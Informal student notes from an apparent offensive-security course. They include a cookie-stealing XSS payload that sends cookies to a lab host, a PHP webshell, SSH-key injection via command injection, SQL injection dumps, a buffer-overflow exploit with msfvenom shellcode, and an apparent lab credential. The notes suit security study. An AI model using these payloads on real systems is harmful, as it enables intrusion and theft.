stack 20 | MIBL-004-M  | FsUjGECRv3HDTQt | 10.50.40.227

DAY1
   
   SCANNING AND RECONAISSANCE
       Scraping data script
         #sudo pip3 install lxml
         #sudo pip3 install requests
          
          import lxml.html
          import requests

          page = requests.get('http://quotes.toscrape.com')
          tree = lxml.html.fromstring(page.content)

          authors = tree.xpath('//small[@class="author"]/text()')

          print ('Authors: ',authors)
          
          SCANNING STEPS
          
            Host Discovery
              Find hosts that are online
            Host Enumeration
              Find ports for each host that is online
            Host Interrogation
              Find what service is running on each open/available port
          
          PASSIVE RECON  
          
            cat /etc/os-release - provides OS info

            lsb_release -a - provides OS info

            uname -a - print system information

            hostnamectl - print system information in a cleaned up format

            ip addr - print IP addresses with interfaces

          NMAP SCRIPTS
          
           /usr/share/nmap/scripts
            nmap --script <filename>|<category>|<directory>
            nmap --script-help "ftp-* and discovery"
            nmap --script-args <args>
            nmap --script-args-file <filename>
            nmap --script-help <filename>|<category>|<directory>
            nmap --script-trace
            
            maybe remember these , important or something idk
              http-enum
              http-robots.txt.nse
              smb-os-discovery
              --script"discovery" - runs all discovery type scripts
              
            for i in {1..254}; do (ping -c 1 x.x.x.$i | grep "bytes from" &) ;done 
            
            nmap -Pn -T4 xxx.xxx.xxx.xxx -p- --min-rate=8000
            
            nc xxx.xxx.xxx.xxx (port)
            
            !!! ports 445,9999,3389 being open = telltale sign that you just scanned a windows box !!!
            
            
DAY2
            
    HTTP
        - request
        - reply
      Methods
        - GET *** requesting/retrieving data
        - HEAD 
        - POST *** sending information i.e. login credentials
      ## GET / HTTP/1.1
        - GET *** HTTP method to request/retrieve
        - / *** www.google.com/
        - HTTP/1.1 *** HTTP version being used
      Status Codes
        - 1xx = Informational response
        - 2xx = successful
        - 3xx = Redirection
        - 4xx = Client Error
        - 5xx = Server Error
      Developer Console
        1. Open a web page in firefox
        2. Right click -> view page source
        3. press f12
            document.location; document.cookie; function(); can run existing functions on the website
    WGET & CURL
        WGET
            wget -r -l2 -P /tmp ftp://ftpserver/
             ^ -r recursive, -l2 2 layers deep, -P /tmp saves to tmp directory
                - Per Jake, do not rely on WGET as a crutch
       CURL
            curl -o imstuff.html hhtp://www.reddit.com
            curl 'website' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png *** Send Cookie settings with data, then pipe results
    JavaScript
       js interactive - <script> function myFunction() { document.getElementById("demo").innerHTML = "Paragraph changed.";} </script>
            1. f12 thing
            2. 'console' tab
            3. can run function, i.e. 'changeText()'
        
        
        
                 Web Enumeration Steps
                         The goal of web enumeration is to find out the existing webpages and webdirectories
                                    - Host Discovery (ping sweep)
                                    - Host Enumeration (port scan) nmap -Pn -T5 x.x.x.x -p-
                                    - Service enumeration (-sV|banner.nse) nmap -Pn -T5 x.x.x.x -sV -p <ports> nmap -Pn -T5 x.x.x.x --script=banner.nse -p <ports>
                                    - Web Enumeration nmap -Pn -T5 -sT -p 80 --script http-enum.nse x.x.x.x nmap -Pn -T5 -sT -p 80 --script http-sql-injection.nse x.x.x.x nmap -Pn -T5 -sT -p 80 --script http-robots.txt.nse x.x.x.x
                                      ^ robots.txt finds webpages you can navigate to outside of the normal means
                                  So what actually is the robots.txt file?
                                   Robots.txt tells webcrawlers what can and cannot be indexed  Ex. http://foxnews.com/robots.txt
   
       nikto v -h xxx.xxx.xxx.xxx *** good stuff
    
    Cross-site Scripting (XSS)
         <script>alert('XSS');</script> 
            - find a space where you can enter a value, f12 to see if theres a javascript
            - input that command into said space, try double quotes in single didnt work
            - if determined the field is vunerable,
                     vi cookie_stealer.php
                       <?php
                       $cookie = $_GET["username"];
                       $steal = fopen("/var/www/html/(** complete path to upload location (demo: /uploads)**)/cookiefile.txt", "a+");
                       fwrite($steal, $cookie . "\n");
                       fclose($steal);
                       ?>
            - find file upload prompt on site 
            - /robots.txt to find potential locations
            - navigate to said location (yippie? maybe, hopefully)
            - **
            - upload cookiefile.txt
            - navigate back to original input field 
            - <script>document.location="http://10.50.22.27/uploads/cookies_stealer.php?username="+document.cookie;</script>
                                         ^^ path to where ever your file uploads ^^     ^^ whatever GET variable was set as              
                              
         
    Server-Side Injection
      view_image.php?file=../../../../../../etc/passwd ** can't have too many ../, over 15 then touch grass
        - ideal situation: "file to read: " prompt
         - view page source
        - if successful, will display /etc/passwd and can see users to target
        
        
        
        Malicious File Upload (Webshell)
        
        - Can you upload? Yes (.php)
        - Are file extensions being sanitized? No
        - Can you access the uploads directory? Yes
        
    webshell.php:
        <HTML><BODY>
        <FORM METHOD="GET" NAME="myform" ACTION="">
        <INPUT TYPE="text" NAME="cmd">
     #  <INPUT TYPE="submit" VALUE="Send">
        </FORM>
     #  <pre>
        <?php
     #  if($_GET['cmd']) {
          system($_GET['cmd']);
          }
        ?>
     #  </pre>
        </BODY></HTML>
    
        - Go back to 10.50.34.125/cmdinjection/cmdinjectdemo.php
        - try entering commands (must have a semicolon before command, i.e. ; whoami)
    
    
    SSH Keys 
       ssh student@x.x.x.x password
   Generate keys on whichever host you plan on logging in from (lin-ops)
       - ssh-keygen -t rsa -b 4096
        - public key is found in /home/student/.ssh/id_rsa.pub (cat)
   Determine usr's home directory
     ;cat /etc/passwd
       - www-date:x:33:33:www-data:/var/www:/bin/bash
       - user: www-data
       - home dir: /var/www
       - login shell: /bin/bash
   Determine if .ssh/ directory exists in the users home directory; if not, create it
       - ;mkdir /var/www/.ssh
   Validate the .ssh/ directory has been created
       - ;ls -la /var/www
   Inject our key into the authorized_keys file (create directory if needed)
       - echo  'ssh-rsa XcsEHSnd...== student@lin-ops' > /var/www/.ssh/authorized_keys
   Validate the public is inside the authorized_keys file
       - ;cat /var/www/.ssh/authorized_keys
   Login from the workstation you generated the key from
       - ssh www-data@x.x.x.x
    
    
DAY3
cd 
     SQL

         USE             select the DB you would like to use.
         SELECT          extracts data from a database
         UPDATE          updates data in a database
         DELETE          deletes data from a database
         INSERT INTO     inserts new data into a database
         CREATE DATABASE creates a new database
         ALTER DATABASE  modifies a database
         CREATE TABLE    creates a new table
         ALTER TABLE     modifies a table
         DROP TABLE      deletes a table
         CREATE INDEX    creates an index (search key)
         DROP INDEX      deletes an index
         UNION           Used to combine the result-set of two or more SELECT statements

POST Method
         - Determine vunerable webpage via truth statement ex. Audi' or 1='1; --
         - Determine the number of columns that exist on the webpage via fuzzing ex. Audi' UNION select 1,2,3,4,5; #
         - Determine the number of columns, the order, and if there are any hidden columns
         - Dumping/extracting information via golden statement 
              statement in question - SELECT table_schema,table_name,column_name FROM information_schema.columns
               ex. Audi' UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns; # (found schema session, with table user, with columns name, pass)
         - Extracting desired information
               ex. Audi' UNION select id,2,name,pass,5 from session.user; #

    user: 'or 1='1
    pass: 'or 1='1
    badguy.com/login.php?user='or1='1&pass='or1='1

GET Method
         - Determine vunerable webpage via truth statement
            value or 1=1
               ex. http://10.50.21.144/uniondemo.php?Selection=2 or 1=1
         - Determine the number of columns that exist on the table displayed on the webpage via fuzzing
            see step 1
         - Determine the number of columns, the order, and if there are any hidden columns
            
         - Dumping/extracting information via golden statement
         
         
         
DAY4
      REVERSE ENGINEERING 
        x86_64 Assembly - Common Instruction Pointers
         MOV/LEA  move source to destination
         PUSH     push source onto stack
         POP      pop top of stack to destination *** rounds in a magazine
         INC      increment source by 1 
         DEC      decrement source by 1 
         ADD      add source to dstination
         SUB      subtract source from destination
         CMP/TEST Compare 2 values by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same.
         JMP      jump to specified location
         LE       jump if less than or equal *** JLE A, B * JUMP IF B IS LESS THAN A 
         E        jump if equal
         JNZ      jump if not 0
         [edp+var_4] ** probably user input
         
         Steps
         static 
            - determine file type:: file <filename> OR IDA
            - find plain text ascii and unicode:: strings -n <number> <filename> OR IDA view > subviews > strings
            - CFF explorer
            - GNU debugger:: gdb <filename>
            behavioral
               - run file, fuck with it and see what it does
               dynamic
                  - tbd
                  disassembly
                     - IDA / Ghidra
                     - file > importfile > file_to_import
                     - compare hashes from ghidra summary and linux md5sum to verify file integrity
                     - example output from middle pane w/ their meaning:
                         00407cc2   83 c0 08   ADD		            EAX,0x8
                         Memory	   Opcodes    ASM Instruction    Operands
                     - Ghidra
                      -  ; is shortcut for command to add comments, param_1 means user input in ghidra
                      -  search strings for artifacts to find functions and variables
                      -  double click FUN_ to open functions in ghidra
                      -  to patch, right click and choose "patch instruction"
                      -  after patching, export file as binary to a different name so that it does not overwrite the original file
                      -  to export, ``file > export program > change to binary > give name of patched_<file.exe> so you know which one is patched`
                      -  to run the patched file, .<patched_file.exe>
                     document findings
         
C Source Code
main(): indicates main entry point and start of program
printf = sends formatted output to stdout
%d = signed decimal integer * placeholder
%f = decimal floating point
%s = strings
fgets(): reads a line from the specified stream and stores it inot the string pointned ot by str. char *fgets(char *str, in n, FILE *stream)
strcmp(): compares str1 and str2
atoi(): ascii to integer
         
         
DAY5
      EXPLOIT DEVELOPMENT
         Stack Operational Terms (stack,base pointer,shell code,etc)- see student guide
      
      Disassembly Tools 
         - IDA, GHIDRA (optional)
         - GDB linux debugger
         - MONA python plugin for IMMUNITY debugger
         
      Exploit Development Process 
         - Run it 
         - Attempt to overflow it
         - Open in debugger (GDB) to see how it broke (RED) ****** In demo, <gets@plt> is red, look up "C 'gets' function vunerability" or sum, you get the idea
             - gdb func
              - pdisass main
               - pdisass vunerable function
                - run, make it overflow
                 - "repeats x times"
                  - get pattern from wiremask (below**) and get funny offset number
               - gdb <function>
                - gdb-peda$ run <<< $(python /home/student/Downloadsfuncballs.py)
                  - Find EIP 
                           ESP: 0xffffd480 ("Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
                           EIP: 0x31634130 ('0Ac1')
                           EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
          **          - paste EIP into https://wiremask.eu/tools/buffer-overflow-pattern-generator/
                        - this will show you the offset, line 3 places 4 bits (length of EIP) at the end of the offset for verification
                                  1 buf = "A" * 62                                                                                                                                                                                                 
                                  2 
                                  3 eip = "B" * 4
                                  4 
                                  5 print(buf + eip)
                              -  gdb-peda$ run <<< $(python /home/student/Downloadsfuncballs.py)
                                - make sure EIP is : 0xwhatever ('BBBB')
                        
                        
                  env - gdb func
                  (gdb) show env
                  LINES=16
                  COLUMNS=53
                  (gdb) unset env LINES
                  (gdb) unset env COLUMNS
                  (gdb) run
                  Starting program: /home/student/Downloads/func 
                  Enter a string: 
                  aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

                  Program received signal SIGSEGV, Segmentation fault.
                  0x61616161 in ?? ()
                  (gdb) info proc map  ***** has to be done on TARGET machine
                  process 14774
                  Mapped address spaces:

                     Start Addr   End Addr       Size     Offset objfile
                     0x56555000 0x56556000     0x1000        0x0 /home/student/Downloads/func
                     0x56556000 0x56557000     0x1000        0x0 /home/student/Downloads/func
                     0x56557000 0x56558000     0x1000     0x1000 /home/student/Downloads/func
                     0x56558000 0x5657a000    0x22000        0x0 [heap]
                     0xf7de0000 0xf7fb5000   0x1d5000        0x0 /lib/i386-linux-gnu/libc-2.27.so *********** START Addr
                  ---Type <return> to continue, or q <return> to quit---                                                  
                     0xf7fb5000 0xf7fb6000     0x1000   0x1d5000 /lib/i386-linux-gnu/libc-2.27.so
                     0xf7fb6000 0xf7fb8000     0x2000   0x1d5000 /lib/i386-linux-gnu/libc-2.27.so
                     0xf7fb8000 0xf7fb9000     0x1000   0x1d7000 /lib/i386-linux-gnu/libc-2.27.so
                     0xf7fb9000 0xf7fbc000     0x3000        0x0 
                     0xf7fcf000 0xf7fd1000     0x2000        0x0 
                     0xf7fd1000 0xf7fd4000     0x3000        0x0 [vvar]
                     0xf7fd4000 0xf7fd6000     0x2000        0x0 [vdso]
                     0xf7fd6000 0xf7ffc000    0x26000        0x0 /lib/i386-linux-gnu/ld-2.27.so
                     0xf7ffc000 0xf7ffd000     0x1000    0x25000 /lib/i386-linux-gnu/ld-2.27.so
                     0xf7ffd000 0xf7ffe000     0x1000    0x26000 /lib/i386-linux-gnu/ld-2.27.so *********** END Addr
                     0xfffdd000 0xffffe000    0x21000        0x0 [stack]
                     (gdb) find /b 0xf7de0000, 0xf7ffe000, 0xff, 0xe4

                        0xf7f6ce1f
                        0xf7f6cf87
                        0xf7f6d04f
                        0xf7f6d10f
                        0xf7f6d2df
                        0xf7f6d587
                        0xf7f6d5cf
                        0xf7f6d79f
                        0xf7f6daf7
                        0xf7f6dc7f
                        0xf7f737b3
                        0xf7f76a5f
                        0xf7f78a5f
                        0xf7f78cbf
                        0xf7f832e7
                        0xf7f912a3
                        0xf7f91df7
                        0xf7f99177

                    1 buf = "A" * 62
                    2 
                    3 eip = "\x1f\xce\xf6\xf7" 
                    4 '''
                    5 0xf7f6ce1f
                    6 0xf7f6cf87
                    7 0xf7f6d04f
                    8 0xf7f6d10f
                    9 '''                                                                                                                                                                                                            
                   10 print(buf + eip)

                  msfvenom -p linux/x86/exec CMD="whoami" -b '\x00' -f python

                     buf =  b""
                     buf += b"\xbf\x40\x15\x40\x1a\xd9\xeb\xd9\x74\x24\xf4\x58\x33"
                     buf += b"\xc9\xb1\x0b\x31\x78\x14\x03\x78\x14\x83\xc0\x04\xa2"
                     buf += b"\xe0\x2a\x11\x7a\x92\xf9\x43\x12\x89\x9e\x02\x05\xb9"
                     buf += b"\x4f\x66\xa1\x3a\xf8\xa7\x53\x52\x96\x3e\x70\xf6\x8e"
                     buf += b"\x46\x76\xf7\x4e\x3e\x1e\x98\x2f\xad\xb7\x66\xe7\x7e"
                     buf += b"\xce\x86\xca\x01"

                 1 buff = "A" * 62
                 2 
                 3 eip = "\x1f\xce\xf6\xf7"
                 4 '''
                 5 0xf7f6ce1f
                 6 0xf7f6cf87
                 7 0xf7f6d04f
                 8 0xf7f6d10f                                                                                                                                                                                                     
                 9 '''
                10 nop = '\x90' * 10
                11
                12 buf =  b""
                13 buf += b"\xbf\x40\x15\x40\x1a\xd9\xeb\xd9\x74\x24\xf4\x58\x33"
                14 buf += b"\xc9\xb1\x0b\x31\x78\x14\x03\x78\x14\x83\xc0\x04\xa2"
                15 buf += b"\xe0\x2a\x11\x7a\x92\xf9\x43\x12\x89\x9e\x02\x05\xb9"
                16 buf += b"\x4f\x66\xa1\x3a\xf8\xa7\x53\x52\x96\x3e\x70\xf6\x8e"
                17 buf += b"\x46\x76\xf7\x4e\x3e\x1e\x98\x2f\xad\xb7\x66\xe7\x7e"
                18 buf += b"\xce\x86\xca\x01"
                19 
                20 
                21 print(buff + eip + nop + buf)

               - gdb-peda$ run <<< $(python /home/student/Downloads/funcballs.py)
               
               - student@lin-ops:~/Downloads$ ./func <<< $(python funcballs.py)
                 Enter a string: 
                 student


               - double nop sled
               - regenerate shell code (msfvenom)
               - double check programming (variables, \xf7, etc)
               - pick another jump esp (from info proc map >> find command)
               - take the L loser, do it all over again 
      
      
      
      
      
      
      
